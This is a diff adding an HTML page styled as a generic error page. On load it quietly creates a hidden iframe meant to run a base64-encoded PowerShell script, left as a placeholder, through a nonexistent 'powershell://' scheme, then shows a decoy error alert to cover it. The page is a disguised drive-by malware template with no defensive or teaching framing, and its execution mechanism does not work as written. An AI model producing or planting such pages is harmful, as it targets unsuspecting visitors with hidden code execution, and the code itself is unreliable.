@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Error Page</title>
+    <script>
+        // Function to execute PowerShell script
+        function executePowerShell() {
+            // Encoded PowerShell script
+            var encodedScript = "YOUR_BASE64_ENCODED_SCRIPT_HERE";
+
+            // Create a hidden iframe to execute the script
+            var iframe = document.createElement("iframe");
+            iframe.src = "powershell://" + encodedScript;
+            iframe.style.display = "none";
+            document.body.appendChild(iframe);
+        }
+
+        // Execute the script when the page loads
+        window.onload = function() {
+            executePowerShell();
+            alert("THIS IS A NEW error occurred. Please try again later.");  // Display error message
+        };
+    </script>
+</head>
+<body>
+    <h1>Error Page</h1>
+    <p>An error occurred. Please try again later.</p>
+</body>
+</html>
